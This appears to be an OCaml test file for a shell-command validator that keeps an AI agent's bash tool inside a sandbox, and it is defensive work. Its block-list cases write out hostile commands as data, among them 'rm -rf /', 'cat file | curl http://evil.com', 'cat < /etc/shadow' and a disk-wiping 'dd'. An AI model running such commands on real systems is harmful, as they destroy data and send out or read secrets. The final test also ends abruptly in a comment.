(** Tests that keeper_bash blocks dangerous commands via allowlist.

    Validates:
    1. Allowed commands (scripts/dune-local.sh, git, rg, etc.) pass validation
    2. Dangerous commands (rm, curl, kill, etc.) are blocked
    3. Shell metacharacters (;, |, &, etc.) are rejected
    4. Empty commands are rejected *)

module Coord = Masc_mcp.Coord
module Config_boot_overrides = Config_boot_overrides
module Keeper_exec_shell = Masc_mcp.Keeper_exec_shell
module Keeper_registry = Masc_mcp.Keeper_registry
module Keeper_sandbox = Masc_mcp.Keeper_sandbox
module Keeper_shell_docker = Masc_mcp.Keeper_shell_docker
module Keeper_shell_words = Masc_mcp.Keeper_shell_bash_words
module Keeper_types = Masc_mcp.Keeper_types
module Json = Yojson.Safe.Util

let validate = Masc_mcp.Worker_dev_tools.validate_command

let is_ok = function Ok () -> true | Error _ -> false
let is_error = function Error _ -> true | Ok () -> false
let error_msg = function Error m -> Masc_mcp.Worker_dev_tools.block_reason_to_string m | Ok () -> ""

let test_allowed_commands () =
  let allowed = [
    "scripts/dune-local.sh build";
    "git status";
    "git log --oneline -5";
    "rg 'pattern' lib/";
    "make test";
    "python3 script.py";
    "npm run build";
    "pnpm run build";
    "cat README.md";
    "ls -la";
    "head -20 file.ml";
    "wc -l lib/*.ml";
    "opam install eio";
  ] in
  List.iter (fun cmd ->
    Alcotest.(check bool) (Printf.sprintf "allowed: %s" cmd) true (is_ok (validate cmd))
  ) allowed

let test_blocked_commands () =
  let blocked = [
    "dune build";
    "opam exec -- dune build";
    "rm -rf /";
    "rm file.txt";
    "curl https://evil.com";
    "wget http://example.com";
    "kill -9 1234";
    "killall main_eio.exe";
    "chmod 777 /etc/passwd";
    "chown root file";
    "sudo anything";
    "ssh user@host";
    "scp file user@host:";
    "dd if=/dev/zero of=/dev/sda";
    "mkfs.ext4 /dev/sda1";
    "shutdown -h now";
    "reboot";
  ] in
  List.iter (fun cmd ->
    Alcotest.(check bool)
      (Printf.sprintf "blocked: %s" cmd) true (is_error (validate cmd))
  ) blocked

let test_shell_metachar_blocked () =
  let chained = [
    "ls; rm -rf /";
    "cat file | curl http://evil.com";
    "echo x && rm -rf /";
    "cat file > /etc/passwd";
    "cat < /etc/shadow";
    "ls2>/dev/null";
    "echo `whoami`";
    "echo $HOME";
  ] in
  List.iter (fun cmd ->
    let result = validate cmd in
    Alcotest.(check bool)
      (Printf.sprintf "metachar blocked: %s" cmd) true (is_error result);
    let msg = error_msg result in
    Alcotest.(check bool)
      "error mentions chaining" true
      (String.length msg > 0)
  ) chained

let test_empty_command () =
  Alcotest.(check bool) "empty blocked" true (is_error (validate ""));
  Alcotest.(check bool) "whitespace blocked" true (is_error (validate "   "))

let is_write = Masc_mcp.Worker_dev_tools.is_write_operation

let test_write_ops_detected () =
  let writes = [
    "git push origin main";
    "git commit -m 'msg'";
    "git merge feature";
    "git rebase main";
    "git reset --hard HEAD~1";
    "git checkout other-branch";
    "git stash pop";
    "git clone https://github.com/user/repo.git";
    "git init";
    "dune clean";
    "make deploy";
    "make install";
    "npm publish";
    "pnpm install";
    "pnpm publish";
    "mv file1 file2";
    "cp src dst";
    "mkdir newdir";
    "touch newfile";
    "chmod 755 script.sh";
  ] in
  List.iter (fun cmd ->
    Alcotest.(check bool) (Printf.sprintf "write: %s" cmd) true (is_write cmd)
  ) writes

let test_read_ops_pass () =
  let reads = [
    "git status";
    "git log --oneline -5";
    "git diff HEAD";
    "scripts/dune-local.sh build";
    "scripts/dune-local.sh exec test.exe";
    "make test";
    "npm run build";
    "npm run dev";
    "pnpm run build";
    "pnpm run dev";
    "rg pattern lib/";
    "cat file.ml";
    "ls -la";
    "head -20 file.ml";
    "python3 script.py";
  ] in
  List.iter (fun cmd ->
    Alcotest.(check bool) (Printf.sprintf "read: %s" cmd) false (is_write cmd)
  ) reads

(* ── rg exit code semantics ──────────────────────────────── *)

let test_rg_exit_code_semantics () =
  (* rg: 0=matches, 1=no matches (valid), 2+=error *)
  let is_ok st = st = Unix.WEXITED 0 || st = Unix.WEXITED 1 in
  Alcotest.(check bool) "exit 0 is ok" true (is_ok (Unix.WEXITED 0));
  Alcotest.(check bool) "exit 1 (no match) is ok" true (is_ok (Unix.WEXITED 1));
  Alcotest.(check bool) "exit 2 (error) is not ok" false (is_ok (Unix.WEXITED 2));
  Alcotest.(check bool) "exit 127 (not found) is not ok" false (is_ok (Unix.WEXITED 127))

(* ── git_worktree op: action validation ───────────────────── *)

let test_git_worktree_action_normalization () =
  (* Verify action aliases normalize correctly *)
  let normalize a = String.trim a |> String.lowercase_ascii in
  Alcotest.(check string) "list" "list" (normalize "list");
  Alcotest.(check string) "add" "add" (normalize " Add ");
  Alcotest.(check string) "LIST uppercase" "list" (normalize "LIST");
  Alcotest.(check string) "unknown stays" "remove" (normalize "remove")

let test_git_worktree_branch_required () =
  (* action=add with empty branch should be rejected *)
  let branch = String.trim "" in
  Alcotest.(check bool) "empty branch rejected" true (branch = "")

(* ── Playground path detection ──────────────────────────── *)

let playground_path_of = Masc_mcp.Keeper_alerting_path.playground_path_of_keeper

let normalize_path_for_containment path =
  Masc_mcp.Keeper_alerting_path.normalize_path_for_check path
  |> Masc_mcp.Keeper_alerting_path.strip_trailing_slashes

let temp_dir () =
  let dir = Filename.temp_file "keeper_bash_safety_" "" in
  Unix.unlink dir;
  Unix.mkdir dir 0o755;
  dir

let cleanup_dir dir =
  let rec rm path =
    match Unix.lstat path with
    | { Unix.st_kind = Unix.S_DIR; _ } ->
        Array.iter (fun name -> rm (Filename.concat path name)) (Sys.readdir path);
        Unix.rmdir path
    | _ ->
        Unix.unlink path
  in
  try rm dir with _ -> ()

let rec ensure_dir path =
  if path = "" || path = "." || path = "/" then ()
  else if Sys.file_exists path then ()
  else (
    let parent = Filename.dirname path in
    if parent <> path then ensure_dir parent;
    Unix.mkdir path 0o755)

let test_playground_path_structure () =
  (* playground_path_of_keeper returns relative path ending with / *)
  Alcotest.(check string) "cheolsu"
    ".masc/playground/cheolsu/" (playground_path_of "cheolsu");
  Alcotest.(check string) "masc-improver"
    ".masc/playground/masc-improver/" (playground_path_of "masc-improver")

let is_inside_playground ~playground_abs cwd =
  let playground_abs = normalize_path_for_containment playground_abs in
  let cwd = normalize_path_for_containment cwd in
  String.starts_with ~prefix:(playground_abs ^ "/") (cwd ^ "/")
  || String.equal playground_abs cwd

let test_playground_guard_inside () =
  let pg = "/project/.masc/playground/cheolsu" in
  (* Inside playground: various depths *)
  Alcotest.(check bool) "exact playground dir"
    true (is_inside_playground ~playground_abs:pg pg);
  Alcotest.(check bool) "repos subdir"
    true (is_inside_playground ~playground_abs:pg (pg ^ "/repos/masc-mcp"));
  Alcotest.(check bool) "deep nested"
    true (is_inside_playground ~playground_abs:pg (pg ^ "/repos/masc-mcp/lib/keeper"))

let test_playground_guard_outside () =
  let pg = "/project/.masc/playground/cheolsu" in
  (* Outside playground: main repo and other keepers *)
  Alcotest.(check bool) "project root"
    false (is_inside_playground ~playground_abs:pg "/project");
  Alcotest.(check bool) "project lib"
    false (is_inside_playground ~playground_abs:pg "/project/lib/keeper");
  Alcotest.(check bool) "other keeper playground"
    false (is_inside_playground ~playground_abs:pg "/project/.masc/playground/sangsu");
  Alcotest.(check bool) "playground parent"
    false (is_inside_playground ~playground_abs:pg "/project/.masc/playground");
  (* Prefix attack: cheolsu2 should not match cheolsu *)
  Alcotest.(check bool) "prefix attack (cheolsu2)"
    false (is_inside_playground ~playground_abs:pg (pg ^ "2/repos"))

let test_playground_guard_trailing_slash () =
  let pg = "/project/.masc/playground/cheolsu/" in
  Alcotest.(check bool) "trailing slash exact match"
    true (is_inside_playground ~playground_abs:pg "/project/.masc/playground/cheolsu");
  Alcotest.(check bool) "trailing slash nested match"
    true
    (is_inside_playground ~playground_abs:pg
       "/project/.masc/playground/cheolsu/repos/masc-mcp")

let test_playground_guard_symlink_escape () =
  let base = temp_dir () in
  Fun.protect ~finally:(fun () -> cleanup_dir base) @@ fun () ->
  let playground = Filename.concat base ".masc/playground/cheolsu" in
  let repo_root = Filename.concat playground "repos" in
  let outside = Filename.concat base "outside" in
  let symlinked_cwd = Filename.concat repo_root "escape" in
  ensure_dir repo_root;
  ensure_dir outside;
  Unix.symlink outside symlinked_cwd;
  Alcotest.(check bool) "symlinked cwd resolving outside is rejected"
    false (is_inside_playground ~playground_abs:playground symlinked_cwd)

let test_cleanup_dir_does_not_follow_symlinks () =
  let root = temp_dir () in
  Fun.protect ~finally:(fun () -> cleanup_dir root) @@ fun () ->
  let base = Filename.concat root "base" in
  let outside = Filename.concat root "outside" in
  let marker = Filename.concat outside "marker.txt" in
  let link = Filename.concat base "escape" in
  ensure_dir base;
  ensure_dir outside;
  let oc = open_out marker in
  output_string oc "keep me";
  close_out oc;
  Unix.symlink outside link;
  cleanup_dir base;
  Alcotest.(check bool) "cleanup removed base dir" false (Sys.file_exists base);
  Alcotest.(check bool) "outside target preserved" true (Sys.file_exists marker)

let make_config () =
  let tmp = temp_dir () in
  ensure_dir (Filename.concat tmp Common.masc_dirname);
  (tmp, Coord.default_config tmp)

let make_docker_meta name =
  let json =
    `Assoc
      [
        ("name", `String name);
        ("agent_name", `String ("agent-" ^ name));
        ("trace_id", `String ("trace-" ^ name));
        ("goal", `String "sandbox test");
        ("sandbox_profile", `String "docker");
        ("network_mode", `String "none");
      ]
  in
  match Masc_test_deps.meta_of_json_fixture json with
  | Ok meta -> meta
  | Error err -> Alcotest.fail ("make_docker_meta failed: " ^ err)

let with_eio_fs f =
  Eio_main.run @@ fun env ->
  Fs_compat.set_fs (Eio.Stdenv.fs env);
  f ()

let with_boot_override name value f =
  let previous = Config_boot_overrides.get_opt name in
  Config_boot_overrides.set name value;
  Fun.protect ~finally:(fun () ->
    match previous with
    | Some v -> Config_boot_overrides.set name v
    | None -> Config_boot_overrides.clear name) f

let parse_error_field raw =
  Yojson.Safe.from_string raw
  |> Json.member "error"
  |> Json.to_string_option

let test_keeper_bash_elapsed_duration_preserves_positive_sub_ms () =
  let elapsed = Keeper_exec_shell.For_testing.elapsed_duration_ms in
  Alcotest.(check int) "sub-ms positive duration rounds up to 1" 1
    (elapsed ~start_time:10.0 ~end_time:10.0004);
  Alcotest.(check int) "one ms duration stays one" 1
    (elapsed ~start_time:10.0 ~end_time:10.001);
  Alcotest.(check int) "negative clock drift is zero" 0
    (elapsed ~start_time:10.0 ~end_time:9.999);
  Alcotest.(check int) "nan duration is zero" 0
    (elapsed ~start_time:Float.nan ~end_time:10.0)

let test_keeper_bash_timeout_floor_is_not_sub_io_latency () =
  let args = `Assoc [ "timeout_sec", `Float 1.0 ] in
  Alcotest.(check (float 0.001))
    "keeper_bash native timeout floor"
    Keeper_exec_shell.keeper_bash_native_min_timeout_sec
    (Masc_mcp.Keeper_shell_shared.clamp_shell_timeout
       ~min_sec:Keeper_exec_shell.keeper_bash_native_min_timeout_sec
       ~default:Masc_mcp.Keeper_shell_shared.io_timeout_sec
       args)

let test_keeper_bash_shape_uses_shell_ir_for_quoted_literals () =
  let block_tag = Keeper_exec_shell.For_testing.keeper_bash_shape_block_tag in
  Alcotest.(check (option string)) "quoted angle brackets are data" None
    (block_tag "echo '<tag>'");
  Alcotest.(check (option string)) "quoted gh pr checks is data" None
    (block_tag {|echo "run gh pr checks later"|});
  Alcotest.(check (option string)) "real redirect blocks"
    (Some "pipe_or_redirect")
    (block_tag "cat < /tmp/x");
  Alcotest.(check (option string)) "stderr dev-null redirect is normalized" None
    (block_tag "ls repos/masc-mcp/.worktrees/ 2>/dev/null");
  Alcotest.(check (option string)) "spaced stderr dev-null redirect is normalized" None
    (block_tag "ls repos/masc-mcp/.worktrees/ 2> /dev/null");
  Alcotest.(check (option string)) "stdout dev-null redirect still blocks"
    (Some "pipe_or_redirect")
    (block_tag "ls repos/masc-mcp/.worktrees/ >/dev/null");
  Alcotest.(check (option string)) "malformed stderr redirect token blocks"
    (Some "pipe_or_redirect")
    (block_tag "ls repos/masc-mcp/.worktrees/ 2/dev/null");
  Alcotest.(check (option string)) "quoted malformed redirect token is data" None
    (block_tag {|echo "2/dev/null"|});
  Alcotest.(check (option string)) "real gh pr checks blocks"
    (Some "gh_pr_checks")
    (block_tag "gh pr checks 15659 --repo jeong-sik/masc-mcp");
  Alcotest.(check (option string)) "parse-failure fallback remains conservative"
    (Some "substitution")
    (block_tag "echo $(complex-substitution)")

let test_keeper_bash_shell_ir_parse_failure_shape_fallback_is_quote_aware () =
  let block_tag =
    Keeper_exec_shell.For_testing.shell_ir_parse_failure_shape_block_tag
  in
  Alcotest.(check (option string)) "single-quoted redirect is data" None
    (block_tag "printf '%s\\n' '>>>'");
  Alcotest.(check (option string)) "double-quoted redirect is data" None
    (block_tag {|printf "%s\n" ">>>"|});
  Alcotest.(check (option string)) "quoted gh pr checks is data" None
    (block_tag {|echo "run gh pr checks later"|});
  Alcotest.(check (option string)) "real redirect still blocks"
    (Some "pipe_or_redirect")
    (block_tag "cat < /tmp/x");
  Alcotest.(check (option string)) "stderr dev-null redirect is normalized" None
    (block_tag "ls repos/masc-mcp/.worktrees/ 2>/dev/null");
  Alcotest.(check (option string)) "stderr dev-null prefix is not stripped from longer target"
    (Some "pipe_or_redirect")
    (block_tag "ls repos/masc-mcp/.worktrees/ 2>/dev/nullfile");
  Alcotest.(check (option string)) "double-quoted substitution still blocks"
    (Some "substitution")
    (block_tag {|echo "$(date)"|});
  Alcotest.(check (option string)) "single-quoted substitution is data" None
    (block_tag {|echo '$(date) > out'|})

let test_stderr_dev_null_strip_preserves_post_background_redirect () =
  let strip =
    Keeper_exec_shell.For_testing.strip_stderr_dev_null_redirects
  in
  Alcotest.(check (pair string bool))
    "pre-background redirect is normalized"
    ("sleep 1 &", true)
    (strip "sleep 1 2>/dev/null &");
  Alcotest.(check (pair string bool))
    "post-background redirect is preserved"
    ("sleep 1 & 2>/dev/null", false)
    (strip "sleep 1 & 2>/dev/null")

let test_keeper_bash_task_state_hint_uses_task_tools () =
  let hint = Keeper_exec_shell.For_testing.keeper_bash_shape_block_hint in
  match hint {|cat .masc/backlog.json 2>/dev/null | head -20|} with
  | Some msg ->
    Alcotest.(check bool)
      "hint points to keeper_tasks_list"
      true
      (String_util.contains_substring msg "keeper_tasks_list");
    Alcotest.(check bool)
      "hint names guessed backlog path"
      true
      (String_util.contains_substring msg ".masc/backlog.json")
  | None -> Alcotest.fail "expected task-state shell hint"

let test_keeper_bash_task_state_discovery_hint_uses_task_tools () =
  let hint = Keeper_exec_shell.For_testing.keeper_bash_shape_block_hint in
  match hint {|find repos -name "*.json" -path "*/task*" 2>/dev/null | head -20|} with
  | Some msg ->
    Alcotest.(check bool)
      "hint points to keeper_tasks_list"
      true
      (String_util.contains_substring msg "keeper_tasks_list");
    Alcotest.(check bool)
      "hint rejects task files"
      true
      (String_util.contains_substring msg "backlog/task files")
  | None -> Alcotest.fail "expected task-state discovery hint"

let test_keeper_bash_blocks_repo_wide_scans () =
  let block_tag = Keeper_exec_shell.For_testing.keeper_bash_shape_block_tag in
  List.iter
    (fun cmd ->
      Alcotest.(check (option string))
        ("repo-wide scan blocked: " ^ cmd)
        (Some "repo_wide_scan")
        (block_tag cmd))
    [
      {|grep -r "board_post" --include="*.ml" -l|};
      {|find repos/ -type f -name "*.ml"|};
      {|find . -type f -name "*.ml"|};
      {|rg -l "keeper_board_post|board_post" repos/ --type ml|};
      {|rg "board_post"|};
      {|git log --all --oneline --grep board_post|};
      {|bash -lc 'grep -ri "yojson" --include="*.ml" -l'|};
    ];
  List.iter
    (fun cmd ->
      Alcotest.(check (option string))
        ("scoped scan allowed: " ^ cmd)
        None
        (block_tag cmd))
    [
      {|grep -r "board_post" lib|};
      {|find lib -type f -name "*.ml"|};
      {|rg -l "board_post" lib --type ml|};
      {|rg --files lib|};
      {|git log --oneline -20|};
      {|git log --oneline -30 --all|};
      {|git log --all -n 5|};
      {|git log --all --max-count=10|};
    ]

let test_keeper_bash_repo_wide_scan_hints_use_structured_tools () =
  let hint = Keeper_exec_shell.For_testing.keeper_bash_shape_block_hint in
  let block_tag = Keeper_exec_shell.For_testing.keeper_bash_shape_block_tag in
  let cmd = {|git log --oneline --all --grep="15731" 2>/dev/null | head -5|} in
  let tag = block_tag cmd in
  Alcotest.(check bool) "pipelined git log --all is repo_wide_scan" true
    (match tag with Some "repo_wide_scan" -> true | _ -> false);
  (match hint cmd with
   | Some msg ->
     Alcotest.(check bool) "git history hint points to Bash git log" true
       (String_util.contains_substring msg "Bash command=\"git log");
     Alcotest.(check bool) "git history hint mentions grep" true
       (String_util.contains_substring msg "grep=<term>")
   | None -> Alcotest.fail "expected repo-wide git log hint");
  (match hint {|rg "add_comment" repos/ --include '*.ml' --include '*.mli' -l|} with
   | Some msg ->
     Alcotest.(check bool) "rg hint points to Grep" true
       (String_util.contains_substring msg "Use Grep");
     Alcotest.(check bool) "rg hint discourages repos root" true
       (String_util.contains_substring msg "Do not scan repos/")
   | None -> Alcotest.fail "expected repo-wide rg hint")

let test_keeper_bash_repo_wide_recovery_plan_carries_native_args () =
  let module Shape = Masc_mcp.Keeper_shell_bash_shape_messages in
  let plan_exn cmd =
    match Shape.bash_shape_block_recovery_plan ~cmd Shape.Repo_wide_scan with
    | Some plan -> plan
    | None -> Alcotest.fail ("expected recovery plan for " ^ cmd)
  in
  let next_arg_string plan key =
    match List.assoc_opt key plan.Shape.next_args with
    | Some (`String value) -> value
    | Some other ->
      Alcotest.fail
        (Printf.sprintf
           "expected next_args.%s string, got %s"
           key
           (Yojson.Safe.to_string other))
    | None -> Alcotest.fail ("missing next_args." ^ key)
  in
  let git_plan =
    plan_exn {|git log --oneline --all --grep="15731" 2>/dev/null | head -5|}
  in
  Alcotest.(check string) "git next tool" "Bash" git_plan.next_tool;
  Alcotest.(check string)
    "git command"
    "git log --oneline -5 --grep='15731'"
    (next_arg_string git_plan "command");
  Alcotest.(check string)
    "git cwd"
    "REPO_OR_WORKTREE_CWD"
    (next_arg_string git_plan "cwd");
  let rg_plan = plan_exn {|rg TODO repos | head -20|} in
  Alcotest.(check string) "rg next tool" "Grep" rg_plan.next_tool;
  Alcotest.(check string) "rg pattern" "TODO" (next_arg_string rg_plan "pattern");
  Alcotest.(check string)
    "rg scoped path placeholder"
    "repos/REPO/SCOPED_PATH"
    (next_arg_string rg_plan "path");
  let find_plan = plan_exn {|find repos -type f -name "*.ml" | head -30|} in
  Alcotest.(check string) "find next tool" "Bash" find_plan.next_tool;
  Alcotest.(check string)
    "find command"
    "find . -name '*.ml'"
    (next_arg_string find_plan "command");
  Alcotest.(check string)
    "find cwd"
    "REPO_OR_WORKTREE_CWD"
    (next_arg_string find_plan "cwd")

let test_docker_blocks_nested_docker_command () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_docker_meta "docker-nested" in
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:(`Assoc [ ("cmd", `String "docker run --rm alpine true") ]) ()
  in
  match parse_error_field raw with
  | Some err ->
      Alcotest.(check bool) "mentions nested container block" true
        (String_util.contains_substring err
           "blocks nested container runtimes and host socket references")
  | None ->
      Alcotest.fail ("expected error json, got: " ^ raw)

let test_docker_blocks_docker_socket_reference () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_docker_meta "docker-sock" in
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:(`Assoc [ ("cmd", `String "cat /var/run/docker.sock") ]) ()
  in
  match parse_error_field raw with
  | Some err ->
      Alcotest.(check bool) "mentions socket block" true
        (String_util.contains_substring err
           "blocks nested container runtimes and host socket references")
  | None ->
      Alcotest.fail ("expected error json, got: " ^ raw)

let test_nested_runtime_detector_ignores_git_commit_message () =
  Alcotest.(check bool)
    "quoted docker in git commit message is not a nested runtime"
    false
    (Keeper_shell_docker.command_uses_nested_container_runtime
       "git commit -m 'docs: Docker sandbox proof'");
  Alcotest.(check bool)
    "unquoted docker argument is not a nested runtime unless command-position"
    false
    (Keeper_shell_docker.command_uses_nested_container_runtime
       "git commit -m Docker-sandbox-proof");
  Alcotest.(check bool)
    "docker after command separator is still blocked"
    true
    (Keeper_shell_docker.command_uses_nested_container_runtime
       "git status && docker run --rm alpine true");
  Alcotest.(check bool)
    "quoted docker command word is still blocked"
    true
    (Keeper_shell_docker.command_uses_nested_container_runtime
       "\"docker\" run --rm alpine true");
  Alcotest.(check bool)
    "partially quoted docker command word is still blocked"
    true
    (Keeper_shell_docker.command_uses_nested_container_runtime
       "do\"cker\" run --rm alpine true");
  Alcotest.(check bool)
    "env option wrapper still exposes docker command"
    true
    (Keeper_shell_docker.command_uses_nested_container_runtime
       "env -i docker run --rm alpine true");
  Alcotest.(check bool)
    "env terminator still exposes docker command"
    true
    (Keeper_shell_docker.command_uses_nested_container_runtime
       "env -- docker run --rm alpine true");
  Alcotest.(check bool)
    "env value option does not treat its argument as command"
    false
    (Keeper_shell_docker.command_uses_nested_container_runtime
       "env -u docker git commit -m Docker-sandbox-proof");
  Alcotest.(check bool)
    "env split-string wrapper still exposes docker command"
    true
    (Keeper_shell_docker.command_uses_nested_container_runtime
       "env -S 'docker run --rm alpine true'");
  Alcotest.(check bool)
    "env inline split-string wrapper still exposes docker command"
    true
    (Keeper_shell_docker.command_uses_nested_container_runtime
       "env --split-string='docker run --rm alpine true'");
  Alcotest.(check bool)
    "env split-string assignment without runtime remains allowed"
    false
    (Keeper_shell_docker.command_uses_nested_container_runtime
       "env -S 'FOO=docker git commit -m Docker-sandbox-proof'");
  Alcotest.(check bool)
    "quoted socket text is not a nested docker runtime"
    false
    (Keeper_shell_docker.command_uses_nested_container_runtime
       "git commit -m \"mention /var/run/docker.sock in review text\"");
  Alcotest.(check bool) "shell -c docker runtime is blocked" true
    (Keeper_shell_docker.command_uses_nested_container_runtime
       "bash -lc \"docker run --rm alpine true\"");
  Alcotest.(check bool) "command substitution docker runtime is blocked" true
    (Keeper_shell_docker.command_uses_nested_container_runtime
       "echo $(docker run --rm alpine true)");
  Alcotest.(check bool) "path-prefixed docker runtime is blocked" true
    (Keeper_shell_docker.command_uses_nested_container_runtime
       "/usr/bin/docker run --rm alpine true")

let test_docker_nested_guard_blocks_command_substitution () =
  Alcotest.(check bool) "command substitution docker runtime is blocked" true
    (Keeper_shell_docker.command_uses_nested_container_runtime
       "echo $(docker run --rm alpine true)")

let test_docker_nested_guard_blocks_path_prefixed_runtime () =
  Alcotest.(check bool) "path-prefixed docker runtime is blocked" true
    (Keeper_shell_docker.command_uses_nested_container_runtime
       "/usr/bin/docker run --rm alpine true")

let test_docker_blocks_raw_gh_pr_create () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_docker_meta "pr-create-block" in
  let playground =
    Filename.concat base_path (playground_path_of meta.name)
  in
  ensure_dir playground;
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ ("cmd", `String "gh pr create --draft --title proof")
           ; ("cwd", `String playground)
           ])
      ()
  in
  match parse_error_field raw with
  | Some err ->
      Alcotest.(check string) "direct gh pr create blocked"
        "gh_pr_create_requires_keeper_pr_create" err
  | None ->
      Alcotest.fail ("expected gh pr create error json, got: " ^ raw)

let test_docker_blocks_chained_gh_pr_create () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_docker_meta "pr-create-chain-block" in
  let playground =
    Filename.concat base_path (playground_path_of meta.name)
  in
  ensure_dir playground;
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ ( "cmd"
             , `String
                 "cd repos/masc-mcp && gh pr create --draft --title proof"
             )
           ; ("cwd", `String playground)
           ])
      ()
  in
  match parse_error_field raw with
  | Some err ->
      Alcotest.(check string) "chained gh pr create blocked"
        "gh_pr_create_requires_keeper_pr_create" err
  | None ->
      Alcotest.fail ("expected chained gh pr create error json, got: " ^ raw)

let test_docker_blocks_newline_gh_pr_create () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_docker_meta "pr-create-newline-block" in
  let playground =
    Filename.concat base_path (playground_path_of meta.name)
  in
  ensure_dir playground;
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ ( "cmd"
             , `String
                 "echo ok\ngh pr create --draft --title proof"
             )
           ; ("cwd", `String playground)
           ])
      ()
  in
  match parse_error_field raw with
  | Some err ->
      Alcotest.(check string) "newline gh pr create blocked"
        "gh_pr_create_requires_keeper_pr_create" err
  | None ->
      Alcotest.fail ("expected newline gh pr create error json, got: " ^ raw)

let test_docker_blocks_env_wrapped_gh_pr_create () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_docker_meta "pr-create-env-block" in
  let playground =
    Filename.concat base_path (playground_path_of meta.name)
  in
  ensure_dir playground;
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ ( "cmd"
             , `String
                 "env GH_CONFIG_DIR=/tmp/gh gh pr create --draft --title proof"
             )
           ; ("cwd", `String playground)
           ])
      ()
  in
  match parse_error_field raw with
  | Some err ->
      Alcotest.(check string) "env-wrapped gh pr create blocked"
        "gh_pr_create_requires_keeper_pr_create" err
  | None ->
      Alcotest.fail ("expected env-wrapped gh pr create error json, got: " ^ raw)

let test_docker_blocks_command_wrapped_gh_pr_create () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_docker_meta "pr-create-command-block" in
  let playground =
    Filename.concat base_path (playground_path_of meta.name)
  in
  ensure_dir playground;
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ ( "cmd"
             , `String "command gh pr create --draft --title proof"
             )
           ; ("cwd", `String playground)
           ])
      ()
  in
  match parse_error_field raw with
  | Some err ->
      Alcotest.(check string) "command-wrapped gh pr create blocked"
        "gh_pr_create_requires_keeper_pr_create" err
  | None ->
      Alcotest.fail
        ("expected command-wrapped gh pr create error json, got: " ^ raw)

let test_docker_allows_gh_pr_create_prose () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_docker_meta "pr-create-prose" in
  let playground =
    Filename.concat base_path (playground_path_of meta.name)
  in
  ensure_dir playground;
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ ("cmd", `String "echo gh pr create")
           ; ("cwd", `String playground)
           ])
      ()
  in
  Alcotest.(check bool) "prose mention is not PR-create policy block" false
    (parse_error_field raw = Some "gh_pr_create_requires_keeper_pr_create")

let test_docker_missing_seccomp_profile_fails_closed () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_docker_meta "missing-seccomp" in
  with_boot_override "MASC_KEEPER_SANDBOX_SECCOMP_PROFILE"
    (Filename.concat base_path "missing-seccomp-profile.json")
    (fun () ->
      let raw =
        Keeper_exec_shell.handle_keeper_bash
          ~turn_sandbox_factory:None
          ~turn_sandbox_factory_git:None ~exec_cache:None
          ~config ~meta
          ~args:(`Assoc [ ("cmd", `String "pwd") ]) ()
      in
      match parse_error_field raw with
      | Some err ->
          Alcotest.(check bool) "mentions missing seccomp profile" true
            (String_util.contains_substring err
               "sandbox seccomp profile not found")
      | None ->
          Alcotest.fail ("expected error json, got: " ^ raw))

(** Path traversal: if cwd is canonicalized via realpath before the check,
    ../traversal resolves to the actual target. This test verifies that
    a canonicalized traversal path is correctly rejected.
    In production, Unix.realpath on the cwd collapses ".." before comparison. *)
let test_playground_guard_traversal () =
  let pg = "/project/.masc/playground/cheolsu" in
  (* After realpath, ".../cheolsu/repos/../../lib" becomes "/project/lib" *)
  Alcotest.(check bool) "traversal resolves outside (canonicalized)"
    false (is_inside_playground ~playground_abs:pg "/project/lib");
  (* After realpath, ".../cheolsu/repos/../../../.masc" becomes "/project/.masc" *)
  Alcotest.(check bool) "traversal to .masc (canonicalized)"
    false (is_inside_playground ~playground_abs:pg "/project/.masc");
  (* The raw non-canonical form would match the prefix — this proves
     we MUST canonicalize before checking *)
